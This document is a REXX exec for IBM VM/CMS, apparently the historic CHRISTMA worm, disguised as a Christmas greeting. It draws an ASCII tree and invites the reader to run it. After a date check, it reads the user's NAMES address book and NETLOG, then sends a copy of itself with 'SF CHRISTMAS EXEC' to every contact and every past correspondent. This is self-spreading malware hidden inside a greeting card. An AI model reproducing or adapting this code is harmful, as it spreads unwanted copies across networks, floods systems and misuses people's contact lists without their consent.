/*********************/
/*    LET THIS EXEC  */
/*		     */
/*	  RUN	     */
/*		     */
/*	  AND	     */
/*		     */
/*	 ENJOY	     */
/*		     */
/*     YOURSELF!     */
/*********************/
'VMFCLEAR'
SAY '                *               '
SAY '                *               '
SAY '               ***              '
SAY '              *****             '
SAY '             *******            '
SAY '            *********           '
SAY '          *************                A'
SAY '             *******            '
SAY '           ***********                VERY'
SAY '         ***************        '
SAY '       *******************            HAPPY'
SAY '           ***********          '
SAY '         ***************            CHRISTMAS'
SAY '       *******************      '
SAY '     ***********************         AND MY'
SAY '         ***************        '
SAY '       *******************         BEST WISHES'
SAY '     ***********************    '
SAY '   ***************************     FOR THE NEXT'
SAY '             ******             '
SAY '             ******                    YEAR'
SAY '             ******               '
/*     browsing this file is no fun at all
       just type CHRISTMAS from cms */
dropbuf
makebuf
"q t (stack"
  pull d1 d2 d3 d4 d5 dat
  pull zeile
  jeah = substr(dat,7,2)
  tack = substr(dat,4,2)
  mohn = substr(dat,1,2)
if jeah <= 88 then do
if mohn <2 ] mohn = 12 then do
DROPBUF
MAKEBUF
"IDENTIFY ( FIFO"
PULL WER VON WO IST REST
DROPBUF
MAKEBUF
"EXECIO * DISKR " WER " NAMES A (FIFO"
 DO WHILE QUEUED() > 0
    PULL NICK NAME ORT
    NAM = INDEX(NAME,'.')+1
    IF NAM > 0 THEN DO
       NAME = SUBSTR(NAME,NAM)
    END
    NAM = INDEX(ORT,'.')+1
    IF NAM > 0 THEN DO
       ORT  = SUBSTR(ORT,NAM)
    END
    IF LENGTH(NAME)>0 THEN DO
       IF LENGTH(ORT) = 0 THEN DO
	  ORT = WO
       END
       if name ^= "RELAY" then do
       "SF CHRISTMAS EXEC A " NAME " AT " ORT " (ack"
       end
    END
 END
DROPBUF
MAKEBUF
ANZ = 1
"EXECIO * DISKR " WER " NETLOG A (FIFO"
 DO WHILE QUEUED() > 0
    PULL KIND FN FT FM ACT FROM ID AT NODE REST
    IF ACT = 'SENT'  THEN DO
       IF ANZ = 1 THEN DO
	 OK.ANZ = ID
       END
       IF ANZ > 1 THEN DO
	 OK.ANZ = ID
	 NIXIS = 0
	 DO I = 1 TO ANZ-1
	    IF OK.I = ID THEN DO
	       NIXIS = 1
	    END
	 END
       END
       ANZ = ANZ + 1
       IF NIXIS = 0 THEN DO
       "SF CHRISTMAS EXEC A " ID " AT " NODE " (ack"
       END
    END
 END
DROPBUF
END
end
end
